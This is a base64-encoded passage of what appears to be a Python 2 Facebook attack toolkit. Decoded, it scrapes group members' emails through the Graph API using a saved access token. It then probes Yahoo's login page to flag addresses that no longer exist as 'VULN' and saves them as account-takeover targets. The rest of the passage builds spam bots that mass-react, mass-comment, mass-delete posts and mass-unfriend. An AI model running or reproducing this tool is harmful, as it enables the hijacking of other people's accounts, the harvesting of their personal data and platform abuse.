W0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCW1wc2ggPSBbXQoJamNzYiA9IDAKCWlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCgl0cnk6CgkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X3lhaG9vKCkKCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJvbSBncm91cCBcMDMzWzE7OTdtLi4uJykKCWZyaWVuZHMgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCW1pdGNoeSA9IGpzb24ubG9hZHMoZnJpZW5kcy50ZXh0KQoJc2F2ZSA9IG9wZW4oJ291dC9ncm91cE1haWxWdWxuLnR4dCcsJ3cnKQoJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCiAgICAgICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgdyBpbiBtaXRjaHlbJ2RhdGEnXToKCQlqY3NiICs9MQoJCW1wc2guYXBwZW5kKGpjc2IpCgkJaWQgPSB3WydpZCddCgkJZmJfbmFtZSA9IHdbJ25hbWUnXQoJCWxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJeiA9IGpzb24ubG9hZHMobGlua3MudGV4dCkKCQl0cnk6CgkJCW1haWwgPSB6WydlbWFpbCddCgkJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpCgkJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJCWlmICd5YWhvby5jb20nIGluIG90dzoKCQkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikKCQkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCQlici5zZWxlY3RfZm9ybShucj0wKQoJCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsCgkJCQljbGljayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJCQkJc2VhdCA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQkJdHJ5OgoJCQkJCXBpY2tzID0gc2VhdC5zZWFyY2goY2xpY2spLmdyb3VwKCkKCQkJCWV4Y2VwdDoKCQkJCQljb250aW51ZQoJCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBpY2tzOgoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IitmYl9uYW1lKQoJCQkJCXN1Y2Vzc2Z1bC5hcHBlbmQobWFpbCkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXBhc3MKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihzdWNlc3NmdWwpKQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L2dyb3VwTWFpbFZ1bG4udHh0IgoJc2F2ZS5jbG9zZSgpCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJbWVudV95YWhvbygpCgojIyMjIyBZQUhPTyBGSUxFICMjIyMjCmRlZiB5YWhvb2xpc3QoKToKCWdsb2JhbCBmYl90b2tlbgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglmaWxlcyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBwYXRoIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJdHJ5OgoJCXRvdGFsID0gb3BlbihmaWxlcywiciIpCgkJbWFpbCA9IHRvdGFsLnJlYWRsaW5lcygpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV95YWhvbygpCgltcHNoID0gW10KCWpjc2IgPSAwCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXNhdmUgPSBvcGVuKCdvdXQvRmlsZU1haWxWdWxuLnR4dCcsJ3cnKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgltYWlsID0gb3BlbihmaWxlcywiciIpLnJlYWRsaW5lcygpCglmb3IgcHcgaW4gbWFpbDoKCQltYWlsID0gcHcucmVwbGFjZSgiXG4iLCIiKQoJCWpjc2IgKz0xCgkJbXBzaC5hcHBlbmQoamNzYikKCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCgkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbAoJCQljbGljayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJCQlzZWF0ID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4uKicpCgkJCXRyeToKCQkJICAgICAgICBwaWNrcyA9IHNlYXQuc2VhcmNoKGNsaWNrKS5ncm91cCgpCgkJCWV4Y2VwdDoKCQkJICAgICAgICBjb250aW51ZQoJCQlpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGlja3M6CgkJCQlzYXZlLndyaXRlKG1haWwgKyAnXG4nKQoJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKQoJCQkJc3VjZXNzZnVsLmFwcGVuZChtYWlsKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKHN1Y2Vzc2Z1bCkpCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQvRmlsZU1haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoKCgojIyMjIyBNRU5VIEJPVCAjIyMjIwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIG1lbnVfYm90KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEJvdCBSZWFjdGlvbnMgVGFyZ2V0IFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBCb3QgUmVhY3Rpb25zIGdyb3VwIFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBCT1QgQ09NTUVOVCBUYXJnZXQgUG9zdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEJPVCBDT01NRU5UIGdyb3VwIFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuXDAzM1sxOzk3bSBNYXNzIGRlbGV0ZSBQb3N0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm02LlwwMzNbMTs5N20gTWFzcyBhY2NlcHQgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gTWFzcyBkZWxldGUgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCgljaG9vc2VfYm90KCkKIy8vLy8vLy8vLy8vLwpkZWYgY2hvb3NlX2JvdCgpOgoJYm90cyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQoJaWYgYm90cyA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWNob29zZV9ib3QoKQoJZWxpZiBib3RzID09IjEiOgoJCW1lbnVfcmVhY3QoKQoJZWxpZiBib3RzID09IjIiOgoJCWdyb3VwX3JlYWN0KCkKCWVsaWYgYm90cyA9PSIzIjoKCQlib3RfY29tbWVudCgpCgllbGlmIGJvdHMgPT0iNCI6CgkJZ3JvdXBfY29tbWVudCgpCgllbGlmIGJvdHMgPT0iNSI6CgkJZGVsZXRlcG9zdCgpCgllbGlmIGJvdHMgPT0iNiI6CgkJYWNjZXB0KCkKCWVsaWYgYm90cyA9PSI3IjoKCQl1bmZyaWVuZCgpCgllbGlmIGJvdHMgPT0iMCI6CgkJbWVudSgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWNob29zZV9ib3QoKQoKIyMjIyMgTUVOVSBSRUFDVCAjIyMjIwpkZWYgbWVudV9yZWFjdCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLiBcMDMzWzE7OTdtTGlrZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLiBcMDMzWzE7OTdtTG92ZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLiBcMDMzWzE7OTdtV293IikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuIFwwMzNbMTs5N21IYWhhIikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuIFwwMzNbMTs5N21TYWRCb3kiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi4gXDAzM1sxOzk3bUFuZ3J5IikKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJY2hvb3NlX3JlYWN0aW9uKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiBjaG9vc2VfcmVhY3Rpb24oKToKCWdsb2JhbCB0aXBlCglhY3Rpb24gPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKCWlmIGFjdGlvbiA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWNob29zZV9yZWFjdGlvbigpCgllbGlmIGFjdGlvbiA9PSIxIjoKCQl0aXBlID0gIkxJS0UiCgkJcmVhY3QoKQoJZWxpZiBhY3Rpb24gPT0iMiI6CgkJdGlwZSA9ICJMT1ZFIgoJCXJlYWN0KCkKCWVsaWYgYWN0aW9uID09IjMiOgoJCXRpcGUgPSAiV09XIgoJCXJlYWN0KCkKCWVsaWYgYWN0aW9uID09IjQiOgoJCXRpcGUgPSAiSEFIQSIKCQlyZWFjdCgpCgllbGlmIGFjdGlvbiA9PSI1IjoKCQl0aXBlID0gIlNBRCIKCQlyZWFjdCgpCgllbGlmIGFjdGlvbiA9PSI2IjoKCQl0aXBlID0gIkFOR1JZIgoJCXJlYWN0KCkKCWVsaWYgYWN0aW9uID09IjAiOgoJCW1lbnVfYm90KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJY2hvb3NlX3JlYWN0aW9uKCkKIyMjIyNORVhUCmRlZiByZWFjdCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglpZGUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIFRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCXRyeToKCQlvaCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCWFoID0ganNvbi5sb2FkcyhvaC50ZXh0KQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBhIGluIGFoWydmZWVkJ11bJ2RhdGEnXToKCQkJeSA9IGFbJ2lkJ10KCQkJcmVhY3Rpb24uYXBwZW5kKHkpCgkJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIreSsiL3JlYWN0aW9ucz90eXBlPSIrdGlwZSsiJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCQlwcmludCAnXDAzM1sxOzkybVtcMDMzWzE7OTdtJyt5WzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXSBcMDMzWzE7OTdtJyt0aXBlCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQgIlxyXDAzM1sxOzkxbVsrXVwwMzNbMTs5Mm0gRG9uZSBcMDMzWzE7OTdtIitzdHIobGVuKHJlYWN0aW9uKSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIElEIG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCiMjIyMjIEJPVCBSRUFDVCBncm91cCAjIyMjIwpkZWYgZ3JvdXBfcmVhY3QoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS4gXDAzM1sxOzk3bUxpa2UiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi4gXDAzM1sxOzk3bUxvdmUiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy4gXDAzM1sxOzk3bVdvdyIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LiBcMDMzWzE7OTdtSGFoYSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LiBcMDMzWzE7OTdtU2FkQm95IikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTYuIFwwMzNbMTs5N21BbmdyeSIpCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIgoJcHJpbnQgIuKVkSIKCWNob29zaW5nX3JlYWN0aW9uKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiBjaG9vc2luZ19yZWFjdGlvbigpOgoJZ2xvYmFsIHRpcGUKCWFjdGlvbiA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQoJaWYgYWN0aW9uID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJY2hvb3NpbmdfcmVhY3Rpb24oKQoJZWxpZiBhY3Rpb24gPT0iMSI6CgkJdGlwZSA9ICJMSUtFIgoJCXJlYWN0ZygpCgllbGlmIGFjdGlvbiA9PSIyIjoKCQl0aXBlID0gIkxPVkUiCgkJcmVhY3RnKCkKCWVsaWYgYWN0aW9uID09IjMiOgoJCXRpcGUgPSAiV09XIgoJCXJlYWN0ZygpCgllbGlmIGFjdGlvbiA9PSI0IjoKCQl0aXBlID0gIkhBSEEiCgkJcmVhY3RnKCkKCWVsaWYgYWN0aW9uID09IjUiOgoJCXRpcGUgPSAiU0FEIgoJCXJlYWN0ZygpCgllbGlmIGFjdGlvbiA9PSI2IjoKCQl0aXBlID0gIkFOR1JZIgoJCXJlYWN0ZygpCgllbGlmIGFjdGlvbiA9PSIwIjoKCQltZW51X2JvdCgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWNob29zaW5nX3JlYWN0aW9uKCkKIyMjIyNORVhUCmRlZiByZWFjdGcoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCXRyeToKCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRlKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlncm91cF9yZWFjdCgpCgl0cnk6CgkJb2ggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjAvIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCWFoID0ganNvbi5sb2FkcyhvaC50ZXh0KQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBhIGluIGFoWydmZWVkJ11bJ2RhdGEnXToKCQkJeSA9IGFbJ2lkJ10KCQkJcmVhY3Rpb25ncm91cC5hcHBlbmQoeSkKCQkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit5KyIvcmVhY3Rpb25zP3R5cGU9Iit0aXBlKyImYWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK3lbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dIFwwMzNbMTs5N20nK3RpcGUKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4ocmVhY3Rpb25ncm91cCkpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBJRCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCgojIyMjIyBCT1QgQ09NTUVOVCAjIyMjIwpkZWYgYm90X2NvbW1lbnQoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybVVzZSBcMDMzWzE7OTdtJzw+JyBcMDMzWzE7OTJtZm9yIG5ldyBsaW5lcyIKCWlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSUQgVGFyZ2V0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJa20gPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUNvbW1lbnQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglrbT1rbS5yZXBsYWNlKCc8PicsJ1xuJykKCXRyeToKCQlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkZSsiP2ZpZWxkcz1mZWVkLmxpbWl0KCIrbGltaXQrIikmYWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJYSA9IGpzb24ubG9hZHMocC50ZXh0KQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBzIGluIGFbJ2ZlZWQnXVsnZGF0YSddOgoJCQlmID0gc1snaWQnXQoJCQljb21tZW50LmFwcGVuZChmKQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNv